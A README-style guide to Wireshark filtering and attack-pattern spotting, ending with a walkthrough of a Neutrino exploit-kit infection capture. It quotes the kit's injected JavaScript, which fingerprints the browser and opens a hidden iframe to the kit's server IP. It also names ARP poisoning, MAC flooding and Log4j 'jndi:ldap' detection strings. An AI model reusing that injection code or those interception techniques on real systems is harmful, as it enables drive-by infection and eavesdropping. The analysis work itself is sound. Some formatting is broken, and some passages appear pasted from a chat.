# WiresharkNetworkPatterns
Documentation focused on pattern discovery in Wireshark, useful for identifying malware, suspicious behavior, and other types of unusual activity.
First, I'll give a very basic overview of Wireshark, and later in this documentation I'll focus in detail on pattern discovery using Malware-Traffic-Analysis.net.

# Starts Here #

1. Fundamentals and Overview (Wireshark 101)
Wireshark is an essential tool for creating and analyzing PCAP (network packet capture) files.

Main Interface: Allows you to specify interfaces for live capture or load existing PCAP files.

Packet Display: Provides critical information such as packet number, time, origin, destination, protocol, length, and general information.

Visual Highlighting: Uses color codes to identify danger levels and different protocols, facilitating visual detection of anomalies.

2. Data Collection Methods
To analyze traffic, you must first know how to collect it:

Network Taps: Physical implants between cables to intercept traffic.

MAC Flooding: Technique to stress the switch until it sends packets to all ports, allowing eavesdropping.

ARP Poisoning: Redirects traffic from a host to your own monitoring machine.

3. Operations and Packet Filtering
Filtering is the heart of efficient analysis, especially in large captures.

Capture Filters: Defined before capture to save only specific parts of the traffic (e.g., tcp port 80).

Display Filters: Changeable during analysis to reduce visible packets (e.g., tcp.port == 80).

Logical Operators: Use and (&&), or (||), eq (==), ne (!=), gt (>), and lt (<) to create complex queries.

Advanced Filters: * contains: Searches for specific values ​​within fields (e.g., http.server contains "Apache").

matches: Allows the use of regular expressions.

upper/lower: Converts strings to uppercase/lowercase to avoid case-sensitivity errors.

4. OSI Layer and Protocol Analysis
Wireshark dissects packets following the OSI model (Layers 1 to 7).

ARP (Layer 2): Connects IPs to MAC addresses. Check the opcodes: 1 for request and 2 for response.

ICMP (Layer 3): Used for diagnostics (ping/traceroute). Type 8 indicates a request and 0 indicates a response. Anomalies in packet size (>64 bytes) may indicate tunneling.

TCP (Layer 4): Focused on the three-way handshake (SYN, SYN-ACK, ACK).

DNS (Layer 7): Resolves names to IPs. DNS traffic in TCP 53 or queries with very long/encoded names are signs of suspicious activity (e.g., data exfiltration).

HTTP/HTTPS: HTTP sends data in plain text (GET/POST). HTTPS uses TLS for encryption, requiring decryption keys (SSLKEYLOGFILE) to view the content.

5. Traffic Analysis and Attack Patterns

To identify threats, you should look for specific patterns:

Nmap Scans: * TCP Connect: Complete handshake, usually with window_size > 1024.

SYN Scan: Does not complete the handshake, usually with window_size <= 1024.

UDP Scan: Identified by ICMP Type 3 Code 3 errors (unreachable port).

Man-in-the-Middle (MITM) Attack: Detected by ARP conflicts (two MACs claiming the same IP) or when the attacker's MAC becomes the destination of all HTTP traffic.

Credential Hunting: Wireshark has a menu in Tools -> Credentials that automatically extracts clear text passwords from protocols such as FTP and HTTP.

Log4j Vulnerability: Search for text patterns such as jndi:ldap or Exploit.class in POST requests.

6. Statistics and Auxiliary Tools

Protocol Hierarchy: Shows the protocol distribution in the capture to identify statistical anomalies.

Endpoints & Conversations: Lists all IPs and unique communications, allowing you to map who is talking to whom.

Firewall ACL Rules: Wireshark can generate ready-made firewall rules (iptables, Cisco IOS, etc.) based on selected packets to quickly block threats.

WALKTHROUGH: MALWAREANALYSIS.NET

01 - NEUTRIN (2013-06-18)
After conducting some research, it's possible to understand that this was a very famous attack between 2013 and 2017, so several patterns have already been identified!

The first one is the URL pattern: [domain]/[random-word].php?seed=[characters] (They usually look like this). Below, using the http.request filter, we can observe the same pattern:

It's interesting to note that I also used a new filter (Host) within the hypertext transfer protocol:

<img width="1755" height="462" alt="image" src="https://github.com/user-attachments/assets/350b3935-7f85-4094-97cb-2379d7315dcb" />

I also used the Content-type filter (within HTTP and dragged it to the columns!)

HTTP.content_type contains "application":

<img width="1836" height="797" alt="image" Using `tcp.stream eq 0`:

[Image of a tcp stream with a width of 1884 and a height of 807]

Looking more closely, you can find this!

[Image of a tcp stream with a width of 1884 and a height of 807]

[Image of a tcp stream with a width of 1884 and a height of 807]

[Image of a tcp stream with a width of 1884 and a height of 807]

[Image of a tcp stream with a width of 1884 and a height of 807]

[Image of a tcp stream with a width of 1884 and a height of 807]

[Image of a tcp stream with a width of 1884 and a height of 807]

[Image of a tcp stream with a width of 1884 and a height of 807] <img width="1835" height="848" alt="image" src="https://github.com/user-attachments/assets/8ad779ef-224f-4538-a19e-bc17aa5b4b99" />

Which is nothing more and nothing less than malicious injection; researching further reveals what it does:

<img width="1835" height="848" alt="image" src="https://github.com/user-attachments/assets/6d235fdd-0d7e-4e33-bf48-3785d2b73960" />

"Code Analysis":
The Fingerprinting Mechanism
The browserDetectNav and showBrowVer functions serve to identify if the victim is an "interesting" target. The code checks:

Operating System: It searches for Windows, Linux, Mac, etc.

Browser and Version: It specifically tests if the user is using Internet Explorer (MSIE) version 8 or higher, Firefox, or Opera.

2. The Attack Condition (The "Filter")

The most critical part is here:

JavaScript

if ((data[0] == 'Opera' || (data[0] == 'MSIE' & data[1] >= 8) || data[0] == 'Firefox') & data[3] == 'Windows')

The Exploit Kit will only act if you are on Windows and using one of these browsers. If you are on Linux or Mac, the code does nothing. This is to avoid "wasting" the exploit on systems it cannot infect and to prevent detection by security researchers.

3. The Redirect (The Malicious Iframe)

If the victim passes the test above, the code executes the silent redirect:

JavaScript

var js_kod2 = document.createElement('iframe');

js_kod2.src = 'http://93.171.172.220/?1';

js_kod2.width = '5px';

js_kod2.height = '6px';

js_kod2.setAttribute('style','visibility:hidden');

It creates an invisible iframe (hidden and with a tiny size).

The src points to the IP 93.171.172.220/?1. This is the Neutrino EK server.

With this search information, we can filter by ip.addr == 93.171.172.220, since we now understand that this is the Neutrino server!

<img width="1856" height="826" alt="image" src="https://github.com/user-attachments/assets/c36f9318-f91d-4e85-acbc-549134f77a7d" />

In this list, we look for the first HTTP GET packet made to this IP. Generally, the URL will be something short like /?1. This is your Landing Page.

Using the TCP stream again, but this time on the first GET request to the address in question:
<img width="1682" height="894" alt="image" src="https://github.com/user-attachments/assets/86cd9375-d2a4-4f2d-a7a2-f7db90f6cbb6" />

Identification of the Java Exploit
Request (Red): The GET request has a random filename (/cbsthcfq?...), which is typical of exploit kits to avoid static signatures.

User-Agent: Note that the file request is no longer being made by the pure IE8 browser, but by Java/1.6.0_25. This indicates that the Landing Page code managed to activate the Java plugin on the victim's computer to download the exploit.

Content-Type: The server responds with application/java-archive, confirming that the file is a .jar. 2. Anatomy of the Malicious File (The Stream Body)

Looking at the blue text (ASCII), we can see the internal structure of the Java file:

PK Signature: The first PK characters indicate that this is a compressed file (ZIP/JAR).

META-INF/MANIFEST.MF: This is the default Java configuration file.

Class Names: You may see strings like Art.class. In a real Neutrino exploit, these classes are often obfuscated to hide code that exploits vulnerabilities such as CVE-2013-2465 or similar vulnerabilities from that era.

To find the final malware now, use this filter in Wireshark:
http.request.method == "GET" && ip.src == 192.168.122.178
The final malware will be the next get packet after the java packet:
<img width="1644" height="342" alt="image" src="https://github.com/user-attachments/assets/4e1a3370-8a28-4041-bf69-85e6127184f6" />

We found the exploit! Just do an HTTP stream and after searching I find this analysis:

1. Binary Identification (MZ Signature)
At the end of the data block you sent, it is possible to clearly seeHere's the signature:

...ylhMzfY-h.u...

The MZ character (which appears as Mz in your stream) are the first two bytes of any Windows executable file (Portable Executable - PE). This confirms that the Neutrino Exploit Kit has successfully exploited the Java vulnerability and is now sending the malicious ".exe" file for execution.

2. Traffic Obfuscation
Note that the file content appears as "garbage" or repetitive text (such as the strings ylh, vwn, wny that are repeated exhaustively).

XOR or Substitution: Neutrino often uses a simple cipher (such as XOR) to "mask" the executable during transmission over the network.

Evasion: This is done so that firewalls and network antivirus (IPS/IDS) do not recognize the file as a malicious executable while it travels over the cable. The malware "unpacks" or "decrypts" this binary in memory as soon as the download finishes. 3. HTTP Header Analysis
Content-Length: 93696: The malware is approximately 91 KB.

Server: nginx/1.4.1: The attacker is using an Nginx server, very common in Exploit Kit infrastructures due to its performance.

User-Agent: Note that the User-Agent remains Java (Java/1.6.0_25), proving that the Java process you identified earlier is the one "pulling" the final file to disk.

Suggested Next Step
To confirm what this malware does, you can try extracting this object from Wireshark:

Go to File > Export Objects > HTTP.

Select the file associated with the URL /drddbg?mebhqtwycgg=nshbdaiqnay.

Save the file and check its hash on sites like VirusTotal to identify the malware family (at that time, Neutrino used to distribute Ransomware or Banking Trojans like Zeus/Zbot).

After running it on VirusTotal:
<img width="1701" height="648" alt="image" src="https://github.com/user-attachments/assets/0062578c-52f0-4a39-ac46-a637eedd4c01" />
Running another friend of his!

<img width="1629" height="764" alt="image" src="https://github.com/user-attachments/assets/9ccec9f8-1821-4547-9d46-a5bcd9734d67" />

That's all for now! Until the next analysis!



